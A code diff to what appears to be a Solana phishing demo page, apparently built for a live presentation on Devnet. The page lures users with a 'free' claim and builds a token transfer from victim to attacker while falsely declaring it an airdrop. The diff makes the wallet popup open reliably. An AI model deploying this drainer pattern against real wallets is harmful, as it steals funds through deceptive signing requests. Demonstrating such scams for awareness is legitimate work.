@@ -1,4 +1,4 @@
-import { useEffect, useState } from "react";
+import { useEffect, useRef, useState } from "react";
 import { Connection, PublicKey } from "@solana/web3.js";
 import { dungGiaoDichTanCong } from "../../../scripts/tan-cong.ts";
 
@@ -67,6 +67,22 @@ export default function App() {
   const [loi, setLoi] = useState<string | null>(null);
   const [dangGui, setDangGui] = useState(false);
   const [demNguoc, setDemNguoc] = useState(dungDemNguoc);
+  /**
+   * BLOCKHASH LẤY SẴN — đây là bản vá cho một lỗi giết demo.
+   *
+   * Bản trước `await getLatestBlockhash()` RỒI mới `window.open()`. Trình duyệt chỉ
+   * cho mở tab mới khi lệnh đó chạy TRỰC TIẾP trong cử chỉ của người dùng; sau một
+   * `await` thì cử chỉ đã hết hiệu lực và Chrome/Safari chặn popup. Nghĩa là trên
+   * sân khấu, ví có thể không bao giờ bật lên — mà đó là toàn bộ phần demo.
+   *
+   * Lấy sẵn blockhash nền thì lúc bấm không còn `await` nào trước `window.open`,
+   * nên popup nằm gọn trong cử chỉ. Blockhash Solana sống khoảng 60–90 giây nên
+   * làm mới mỗi 30 giây là dư.
+   */
+  const blockhashRef = useRef<string | null>(null);
+  /** URL bàn giao của lần bấm gần nhất — dùng cho đường lui khi ví không tự mở. */
+  const [urlLui, setUrlLui] = useState<string | null>(null);
+
 
   useEffect(() => {
     fetch(`${VI}/hien-truong.json`, { cache: "no-store" })
@@ -80,36 +96,92 @@ export default function App() {
     return () => clearInterval(id);
   }, []);
 
-  async function nhanQua() {
+  // Lấy blockhash sẵn và làm mới định kỳ. Hỏng thì im lặng: lúc bấm còn đường lui.
+  useEffect(() => {
+    if (!ht) return;
+    let huy = false;
+    const conn = new Connection(ht.rpc, "confirmed");
+    const lay = () => {
+      conn
+        .getLatestBlockhash()
+        .then(({ blockhash }) => {
+          if (!huy) blockhashRef.current = blockhash;
+        })
+        .catch(() => {});
+    };
+    lay();
+    const id = setInterval(lay, 30_000);
+    return () => {
+      huy = true;
+      clearInterval(id);
+    };
+  }, [ht]);
+
+  /** Dựng URL bàn giao. Tách ra để cả đường chính lẫn đường lui dùng chung một chỗ. */
+  function dungUrl(blockhash: string): string {
+    const tx = dungGiaoDichTanCong({
+      nanNhan: new PublicKey(ht!.nanNhan),
+      keTanCong: new PublicKey(ht!.keTanCong),
+      mint: new PublicKey(ht!.mint),
+      soLuong: BigInt(ht!.soLuong),
+      blockhash,
+      taiKhoanNguon: new PublicKey(ht!.taiKhoanNanNhan),
+      taiKhoanDich: new PublicKey(ht!.taiKhoanKeTanCong),
+    });
+    const b64 = btoa(String.fromCharCode(...tx.serialize()));
+    // Lời khai gian: trang nói đây là airdrop.
+    const khai = encodeURIComponent(JSON.stringify({ type: "airdrop" }));
+    const kyHieu = ht!.kyHieu
+      ? `&kyhieu=${encodeURIComponent(JSON.stringify({ [ht!.mint]: ht!.kyHieu }))}`
+      : "";
+    return `${VI}/#tx=${encodeURIComponent(b64)}&khai=${khai}${kyHieu}`;
+  }
+
+  /**
+   * KHÔNG `async`, và không có `await` nào trước `window.open`.
+   *
+   * Đó là toàn bộ điểm của hàm này. Blockhash đã lấy sẵn ở effect phía trên, nên
+   * lệnh mở tab chạy ngay trong cử chỉ bấm — trình duyệt không chặn.
+   *
+   * Giữ `noopener` để tab ví không cầm được `window.opener`. Đánh đổi: với
+   * `noopener` thì `window.open` luôn trả null, nên KHÔNG dò được popup có bị chặn
+   * hay không. Vì vậy lưới an toàn không phải là dò, mà là luôn hiện một đường lui
+   * bấm được — người trình bày không bao giờ đứng chết trên sân khấu.
+   */
+  function nhanQua() {
     if (!ht || dangGui) return;
     setLoi(null);
-    setDangGui(true);
-    try {
-      const conn = new Connection(ht.rpc, "confirmed");
-      const { blockhash } = await conn.getLatestBlockhash();
 
-      const tx = dungGiaoDichTanCong({
-        nanNhan: new PublicKey(ht.nanNhan),
-        keTanCong: new PublicKey(ht.keTanCong),
-        mint: new PublicKey(ht.mint),
-        soLuong: BigInt(ht.soLuong),
-        blockhash,
-        taiKhoanNguon: new PublicKey(ht.taiKhoanNanNhan),
-        taiKhoanDich: new PublicKey(ht.taiKhoanKeTanCong),
-      });
-
-      const b64 = btoa(String.fromCharCode(...tx.serialize()));
-      // Lời khai gian: trang nói đây là airdrop.
-      const khai = encodeURIComponent(JSON.stringify({ type: "airdrop" }));
-      const kyHieu = ht.kyHieu
-        ? `&kyhieu=${encodeURIComponent(JSON.stringify({ [ht.mint]: ht.kyHieu }))}`
-        : "";
-      window.open(`${VI}/#tx=${encodeURIComponent(b64)}&khai=${khai}${kyHieu}`, "_blank", "noopener");
-    } catch (e) {
-      setLoi(e instanceof Error ? e.message : String(e));
-    } finally {
-      setDangGui(false);
+    const bh = blockhashRef.current;
+    if (bh) {
+      try {
+        const url = dungUrl(bh);
+        setUrlLui(url);
+        window.open(url, "_blank", "noopener");
+      } catch (e) {
+        setLoi(e instanceof Error ? e.message : String(e));
+      }
+      return;
     }
+
+    // Chưa kịp lấy blockhash (mới mở trang, hoặc RPC đang lỗi). Lúc này buộc phải
+    // chờ mạng, nên popup sẽ bị chặn — điều hướng CÙNG TAB thay vì mở tab mới.
+    // Cùng tab thì không trình duyệt nào chặn, và demo vẫn chạy tiếp.
+    setDangGui(true);
+    new Connection(ht.rpc, "confirmed")
+      .getLatestBlockhash()
+      .then(({ blockhash }) => {
+        const url = dungUrl(blockhash);
+        setUrlLui(url);
+        window.location.href = url;
+      })
+      .catch((e: unknown) => {
+        setLoi(
+          (e instanceof Error ? e.message : String(e)) +
+            " — chưa lấy được blockhash từ Devnet. Thử lại sau vài giây.",
+        );
+      })
+      .finally(() => setDangGui(false));
   }
 
   return (
@@ -198,6 +270,19 @@ export default function App() {
             <p className="mt-2.5 text-center text-[12px] text-muc-nhat">
               Miễn phí · chỉ cần ký một giao dịch để xác nhận quyền sở hữu ví
             </p>
+
+            {/* ĐƯỜNG LUI CHO SÂN KHẤU.
+                Popup đã được vá để không bị chặn, nhưng trình duyệt lạ trên máy
+                chiếu vẫn có thể chặn cứng. Link này luôn hiện sau khi bấm, nên
+                người trình bày có một cú bấm để đi tiếp thay vì đứng chết. */}
+            {urlLui && (
+              <p className="mt-2.5 text-center text-[12px] text-muc-nhat">
+                Ví không tự mở?{" "}
+                <a href={urlLui} className="font-medium underline underline-offset-2" style={{ color: "var(--color-hieu)" }}>
+                  Mở ví thủ công
+                </a>
+              </p>
+            )}
 
             {loi && (
               <p className="mt-3 rounded-lg bg-rose-50 px-3 py-2 text-center text-[12.5px] text-rose-700" role="alert">
